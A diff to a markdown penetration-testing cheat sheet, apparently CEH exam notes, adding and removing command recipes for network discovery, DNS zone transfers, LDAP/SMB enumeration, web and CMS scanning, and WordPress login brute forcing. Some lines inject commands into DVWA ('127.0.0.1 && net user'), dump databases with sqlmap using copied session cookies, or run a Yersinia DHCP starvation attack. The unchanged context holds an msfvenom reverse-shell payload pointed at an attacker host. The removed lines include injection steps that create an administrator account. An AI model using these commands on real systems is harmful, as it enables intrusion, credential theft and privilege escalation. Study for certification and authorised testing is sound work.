@@ -37,8 +37,42 @@ nmap -sC -sV -p- -A -v -T4 <host>/CIDR
 
 **Host discovery**    
 netdiscover -i eth0 | netdiscover -r <host>/CIDR
+
+**Live machines**
+sudo fping -a -g <host>/CIDR 2>/dev/null
+sudo nmap -sn <host>/CIDR
+
+**Domain Controler**
+sudo nmap -p 389,445 --open -oG - <host>/CIDR | grep open
 	
 ### WEB & SERVICES
+nikto -h <host>
+
+**Banner Grabbing**
+Use ID Serv from windows
+whatweb <host>
+zaproxy for web crawling
+nmap -A <host> and look at http-server-header for load balancing
+telnet <host> <port>
+nc -v <host> <port>
+nmap -sV <host>
+echo -e "HEAD / HTTP/1.1\r\nHost: <host>\r\nConnection: close\r\n\r\n" | nc <host> 80
+curl -I http://<host>
+openssl s_client -connect <host>:<port>
+
+**Geolocation**
+dig +short certifiedhacker.com | 162.241.216.11
+nmap --script ip-geolocation-geoplugin 162.241.216.11 
+
+**Zone Transfer**
+dig ns certifiedhacker.com | ns2.bluehost.com
+dig axfr certifiedhacker.com @ns2.bluehost.com
+
+**FQDN**
+nmap -sC -sV <host>
+Look for DNS Computer Name
+Find FQDN
+nmap -p389 –sV -iL <host>  or nmap -p389 –sV <host> (Find the FQDN in a subnet/network)
 
 ## 2. SERVICE ENUMERATION
 
@@ -95,6 +129,7 @@ https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
 
 **Enumarate DNS**  
 dnsrecon -w -d <host> |  dnsrecon -d <host> -z
+dig NS certifiedhacker.com
 
 **Brute forcing**  
 nmap --script dns-brute <host>
@@ -129,6 +164,12 @@ use auxiliary/scanner/snmp/snmp_login
 show options
 set RHOST <host>
 exploit
+
+### LDAP PORT 389,636,3268,3269
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
+
+**Enumerate Users**
+enum4linux -U -o <host>
 
 ### SMB PORT 445
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
@@ -184,6 +225,25 @@ hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt rdp:
 xfreerdp /u:<username> /p:<password> /v:<host>:3389
 
 ### HTTP/HTTPS PORT 80/443/8080/8081
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web
+
+**General purpose automatic scanners**
+Copy
+nikto -h <URL>
+whatweb -a 4 <URL>
+wapiti -u <URL>
+W3af
+zaproxy #You can use an API
+nuclei -ut && nuclei -target <URL>
+
+**CMS scanners**
+cmsmap [-f W] -F -d <URL>
+wpscan --force update -e --url <URL>
+joomscan --ec -u <URL>
+joomlavs.rb #https://github.com/rastating/joomlavs
+
+https://github.com/ignis-sec/puff (client side vulns fuzzer)
+node puff.js -w ./wordlist-examples/xss.txt -u "http://www.xssgame.com/f/m4KKGHi2rVUN/?query=FUZZ
 
 ### Port Login
 
@@ -192,6 +252,10 @@ xfreerdp /u:<username> /p:<password> /v:<host>:3389
 **TELNET Login**		| telnet <host>
 
 ## 3. System Hacking
+https://nvd.nist.gov/vuln/search
+
+**OpenVAS**
+Vulnerability scanner
 
 **To create a Payload**
 msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe 
@@ -213,12 +277,21 @@ Now to capture password click on edit in menu bar, then near Find packet section
 from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
 
 **To the Find DOS & DDOS**
-go to Statistics and Select Conversations , sort by packets in IPv4 based on number of Packets transfer
+Go to Statistics and Select Conversations , sort by packets in IPv4 based on number of Packets transfer
 Statistics > Conversations > IPv4 > Packets
 To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0
 
+**To find sniffing**
+Ctrl+F duplicate
+
+**IoT**
+Filter mqtt
+
 ### Follow up Streams
 select_packet > follow > TCP Stream
+
+**To find message hidden with CovertTCP**
+Apply filter tcp. Under IPv4 -> Identification follow the message.
 
 | Finding Files | 3 |
 | Finding Comments | 4 |
@@ -269,6 +342,10 @@ cc -o covert_tcp covert_tcp.c (On both client and server)
 ./covert_tcp -source <ip address of sender> -source_port <sender destination port number> -server -file <file name>
 
 ## 6. Cryptography
+
+**l0phtCrack**
+Password auditing wizard
+
 **Hash Identifier**
 https://www.onlinehashcrack.com/hash-identification.php
 
@@ -296,6 +373,7 @@ for encoding and decoding text in a file (.hex)
 
 ### CryptoForge 
 for encrypting/decrypting the files
+Choose the encription/decription type and add the key
 
 When installed you will get the option when right clicking on a file to encrypt/decrypt
 
@@ -360,6 +438,36 @@ wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt
 
 ## 7. Hacking WebServers & WebApps
 
+
+**Directory Bruteforcing**
+gobuster dir -u <host> -w /home/attacker/Desktop/common.txt
+
+**Enumerate a Web Application using WPscan & Metasploit**
+wpscan --url http://<host>:<port>/NEW --enumerate u  (u means username) 
+Then type msfconsole to open metasploit. 
+Type -  use auxilliary/scanner/http/wordpress_login_enum
+ 						 show options
+						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
+						 set RHOSTS <host>  (target ip)
+						 set RPORT <pot>    (target port)
+						 set TARGETURI http://<host>:<pot>/
+						 set USERNAME admin
+
+**Find if application is vulnerable to XSStrike**
+git clone https://github.com/s0md3v/XSStrike
+cd XSStrike
+pip install -r requirements.txt
+python xsstrike.py -u http://www.cehorg.com
+
+**Command Injection**
+10.10.10.25:8080/DVWA
+use admin/password to login
+click on Command Injection
+10.10.10.25 will ping
+lower security to low in DVWA security
+127.0.0.1 && net user
+127.0.0.1 && type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
+
 ### Nslookup
 **To verify Website's Ip**
 Nslookup wwww.example.com
@@ -378,7 +486,7 @@ set LPORT = attcker-port
 run
 
 **To find the secret file**
-  type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
+type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
   
 ### SQL Injection
 Login bypass with [' or 1=1 --]
@@ -396,26 +504,30 @@ As of optional settings it supports HTTP proxy together with HTTP header values 
 python3 dsss.py -u "url" --cookie="cookie"
 
 ### sqlmap
-Open the vulnerable website 
-Copy the cookie from the inspect element
+Open the vulnerable website - <host> (exmpl: http://movies.cehorg.com/viewprofile.aspx?id=1)
+Copy the cookie from the inspect element -> Console -> type document.cookie and copy the result - <cookie> (exmpl: mscope=Xf4nda2RM2w=; ui-tabs-1=0)
 Open the terminal to use sqlmap 
 
 **List databases, add cookie values**
-sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
+sqlmap -u "<host>" --cookie=”<cookie>” --dbs 
 OR
-sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  
+sqlmap -u "<host>" --cookie=”<cookie>; security=low”   --data="id=1&Submit=Submit" --dbs  
 
 **List Tables, add databse name**
-sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
+sqlmap -u “<host>” --cookie="<cookie>" -D <DataBase> --tables
+OR
+sqlmap -u "<host>" --cookie=”<cookie>; security=low” -D <DataBase> --tables  
 
 **List Columns of that table**
-sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
+sqlmap -u "<host>" --cookie=”<cookie>; security=low” -D <DataBase> -T <Table> --columns
 
 **Dump all values of the table**
-  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
+sqlmap -u “<host>” --cookie="<cookie>" -D <DataBase> -T <Table> --dump
+OR
+sqlmap -u "<host>" --cookie=”<cookie>; security=low” -D <DataBase> -T <Table> --dump
 
 **MySQL**
-mysql -U qdpmadmin -h 192.168.1.8 -P passwod 
+mysql -U qdpmadmin -h <host> -P passwod 
 show databases;
 use qdpm;
 show tables'
@@ -470,48 +582,8 @@ Download File using PhoneSploit
 Enter the Full Path of file to Download
 sdcard/Download/secret.txt
 
-
-Hacking Web Servers
-1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
-						    GET /HTTP/1.0
-						    telnet www.movies.com 80
-						    GET /HTTP/1.0
-2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
-3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
-				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
-Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
-Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
-
-Hacking Web Application
-1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
-2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
-3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
-Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
- 						 show options
-						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
-						 set RHOSTS 10.10.10.10  (target ip)
-						 set RPORT 8080          (target port)
-						 set TARGETURI http://10.10.10.10:8080/
-						 set USERNAME admin
-4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
-			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
-5- Command Injection-  | net user  (Find users)
- 		       | dir C:\  (directory listing)
-                       | net user Test/Add  (Add a user)
-		       | net user Test      (Check a user)
-		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
-		       | net user Test      (Once again check to see if it has become administrator)
-Now you can do a RDP connection with the given ip and the Test account which you created.
-
-hydra -l user -P passlist.txt ftp://10.10.10.10
-
-Wireshark
-tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
-tcp.flags.syn == 1   (Which machine for dos)
-http.request.method == POST   (for passwords) or click tools ---> credentials
-Also
-Find FQDN
-nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
+**Check Android App**
+www.sisik.eu/apk-tool
 
 ## 9. Cracking Wi-Fi networks
 **Cracking Wifi Password**
@@ -593,3 +665,21 @@ chmod +x linpeas.sh
 5 RAT tools
 
 njRAT | MoSucker | ProRat | Theef | HTTP RAT
+
+**To examine malware**
+Use DIE
+For Strings for file pos
+Sample-ELF->Info for Info
+
+**To examine event logs**
+Use jv16PowerTools
+
+**To examine windows services**
+Use ServiceManager from CEH tools
+
+**Starvation attacks**
+Use Yersinia:
+sudo yersinia -G
+open Wireshark
+Start DHCP Discover packets attack
+filter bootp.type==1 in Wireshark
